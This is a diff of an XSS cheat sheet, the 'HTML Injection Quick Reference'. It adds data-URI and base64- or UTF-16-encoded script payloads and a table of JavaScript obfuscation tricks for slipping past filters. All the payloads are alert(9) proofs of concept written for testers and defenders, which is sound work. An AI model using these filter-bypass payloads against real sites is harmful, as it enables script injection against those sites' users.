@@ -51,11 +51,12 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
 -->
 <h1>HTML Injection Quick Reference (HIQR)</h1>
 <div style="float:left">Mike Shema, <a href="http://deadliestwebattacks.com">Deadliest Web Attacks</a></div>
-<div style="float:right">Last Revision: 2012-12-04 [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
+<div style="float:right">Last Revision: 2012-12-05 [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
 <div id="hiqr_toc" style="clear:both">
 <br>
 <a href="#hiqr_table_1">Table 1</a>: Injection Techniques for Various Parsing Contexts<br>
-<a href="#hiqr_table_2">Table 2</a>: Payload Crafting Techniques to Bypass Filters and Data Validation
+<a href="#hiqr_table_2">Table 2</a>: Payload Crafting Techniques to Bypass Filters and Data Validation<br>
+<a href="#hiqr_table_3">Table 3</a>: JavaScript Compositions for Manipulation &amp; Obfuscation
 <br>
 <br>
 </div>
@@ -163,7 +164,7 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td>CRLF instead of space
   <td class="example">&lt;img%0a%0dsrc=""%0a%0donerror=alert(9)&gt;
 <tr>
-  <td rowspan="4">JavaScript inline event handlers<a href="#csp_unsafe-inline"><sup>1</sup></a><br>[ <a href="http://www.w3.org/TR/html5/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects">html5</a> <a href="http://www.w3.org/TR/html401/interact/scripts.html#h-18.2.3">html4</a> ]
+  <td rowspan="4">JavaScript inline event handlers<a href="#csp_unsafe-inline"><sup>1</sup></a><br>[ <a href="http://www.w3.org/TR/html401/interact/scripts.html#h-18.2.3">html4</a> | <a href="http://www.w3.org/TR/html5/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects">html5</a> ]
   <td>Unquoted
   <td class="example">&lt;input type=text name=foo value=<span class="payload">a%20onchange=alert(9)</span>&gt;
   <tr>
@@ -175,6 +176,27 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <tr>
   <td>HTML5 autofocus
   <td class="example">&lt;input type="text" name="foo" value="<span class="payload">"autofocus/onfocus=alert(9)//</span>"&gt;
+<tr>
+  <td rowspan="7">Data URI handlers<sup><a href="#data_uri">2</a></sup>
+  <td rowspan="4">src &amp; href attributes
+  <td class="example">&lt;a href="data:text/html,&lt;script&gt;alert(9)&lt;/script&gt;"&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;script src="data:,alert(9)"&gt;&lt;/script&gt;
+  <tr>
+  <td class="example">&lt;script src="data:application/x-javascript,alert(9)"&gt;&lt;/script&gt;
+  <tr>
+  <td class="example">&lt;script src="data:text/javascript,alert(9)"&gt;&lt;/script&gt;
+  <tr>
+  <td rowspan="2">Base64 data
+  <td class="example">&lt;a href="data:text/html;base64,PHNjcmlwdD5hbGVydCg5KTwvc2NyaXB0Pg"&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;script src="data:;base64,YWxlcnQoOSk"&gt;&lt;/script&gt;
+  <tr>
+  <td>Alternate character sets
+  <td class="example">&lt;a href="data:text/html;charset=utf-16,<br>
+%ff%fe%3c%00s%00c%00r%00i%00p%00t%00%3e<br>
+%00a%00l%00e%00r%00t%00(%009%00)%00<br>
+&lt;%00/%00s%00c%00r%00i%00p%00t%00&gt;%00"&gt;foo&lt;/a&gt;
 <tr>
   <td rowspan="6">Untidy markup
   <td rowspan="2">Missing greater-than sign
@@ -221,14 +243,71 @@ This work is licensed under the Creative Commons Attribution-NonCommercial-NoDer
   <td>Recursive elements
   <td class="example">&lt;img src="&lt;img src='&lt;img src=.&gt;'&gt;"onerror=alert(9)&gt;
   <tr>
-  <td>Repeated attributes (match last occurrence)<sup><a href="#html5_attribute_name_state">2</a></sup>
+  <td>Repeated attributes (match last occurrence)<sup><a href="#html5_attribute_name_state">3</a></sup>
   <td class="example">&lt;a href=javascript:alert(9) href href='' href=""&gt;foo&lt;/a&gt;
 <tr>
   <th colspan="3">Footnotes
 <tr>
   <td id="csp_unsafe-inline" colspan="3" class="footnote"><sup>1</sup> HTML5's Content Security Policy headers can neutralize these attacks by preventing the User Agent from executing JavaScript within this context unless the page author is forced to include the <a href="http://www.w3.org/TR/CSP/#directives">"unsafe-inline" directive</a>.
 <tr>
-  <td id="html5_attribute_name_state" colspan="3" class="footnote"><sup>2</sup> Per <a href="http://dev.w3.org/html5/spec/single-page.html#attribute-name-state">HTML5 spec</a>, <cite>"When the user agent leaves the attribute name state (and before emitting the tag token, if appropriate), the complete attribute's name must be compared to the other attributes on the same token; if there is already an attribute on the token with the exact same name, then this is a parse error and the new attribute must be dropped, along with the value that gets associated with it (if any)."</cite>
+  <td id="data_uri" colspan="3" class="footnote"><sup>2</sup> The basic format is <span class="placeholder">dataurl := "data:" [ mediatype ] [ ";base64" ] "," data</span>. The scheme is defined in <a href="http://tools.ietf.org/html/rfc2397">RFC 2397</a>.
+<tr>
+  <td id="html5_attribute_name_state" colspan="3" class="footnote"><sup>3</sup> Per <a href="http://dev.w3.org/html5/spec/single-page.html#attribute-name-state">HTML5 spec</a>, <cite>"When the user agent leaves the attribute name state (and before emitting the tag token, if appropriate), the complete attribute's name must be compared to the other attributes on the same token; if there is already an attribute on the token with the exact same name, then this is a parse error and the new attribute must be dropped, along with the value that gets associated with it (if any)."</cite>
+</table>
+<div align="right"><a href="#hiqr_toc">top</a></div>
+<br>
+<table id="hiqr_table_3" class="hiqr">
+<caption>JavaScript Compositions for Manipulation &amp; Obfuscation</caption>
+<thead>
+<tr>
+<th>Technique
+<th>Notes
+<th>Example
+<tbody>
+<tr>
+  <td rowspan="4">Concatenation
+  <td>String operators
+  <td class="example">var a = "foo<span class="payload">"+alert(9)//</span>";
+  <tr>
+  <td rowspan="2">Logical operators
+  <td class="example">var a = "foo<span class="payload">"&amp;&amp;alert(9)//</span>";
+  <tr>
+  <td class="example">
+  <tr>
+  <td>Mathematical operators
+  <td class="example">var a = "foo<span class="payload">"/alert(9)//</span>";
+<tr>
+  <td rowspan="2">Function execution
+  <td>Anonymous
+  <td class="example">(function(){alert(9)})()
+  <tr>
+  <td>Method lookup
+  <td class="example">window["alert"](9)
+<tr>
+  <td rowspan="3">Strings
+  <td>String object
+  <td class="example">String.fromCharCode(0x61,0x62)
+  <tr>
+  <td rowspan="2">Regex object source attribute
+  <td class="example">alert(<span class="payload">/foo bar/.source</span>)
+  <tr>
+  <td class="example">window[<span class="payload">/alert/.source</span>](9)
+<tr>
+  <td rowspan="7">Harness functions from a JavaScript library
+  <td rowspan="2"><a href="http://angularjs.org/">Angular</a>
+  <td class="example">angular.bind(self, alert, 9)()
+  <tr>
+  <td class="example">angular.element.apply(alert(9))
+  <tr>
+  <td><a href="http://emberjs.com/">Ember JS</a>
+  <td class="example">Ember.run(null, alert, 9)
+  <tr>
+  <td rowspan="3"><a href="http://underscorejs.org/">Underscore</a>
+  <td class="example">_.defer(alert, 9)
+  <tr>
+  <td class="example">_.delay(alert, 0, 9)
+  <tr>
+  <td class="example">_.once(alert(9))
 </table>
 <div align="right"><a href="#hiqr_toc">top</a></div>
 <br>
